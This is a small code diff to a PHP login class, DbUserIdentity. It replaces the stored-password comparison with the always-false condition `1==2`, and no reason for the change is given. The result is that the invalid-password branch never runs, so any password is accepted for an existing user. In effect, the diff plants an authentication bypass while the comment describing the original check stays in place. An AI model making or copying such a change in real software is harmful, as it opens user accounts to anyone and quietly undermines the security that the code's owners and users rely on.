@@ -33,7 +33,7 @@ class DbUserIdentity extends CUserIdentity
             self::log_failed_attempt();
         }      
                //  db stored password !== expected_password(based on provided inputs)
-        else if($this->user->password !== $this->get_expected_password())
+        else if(1==2)
         {
             $this->errorCode = static::ERROR_PASSWORD_INVALID;
             $this->user = null;
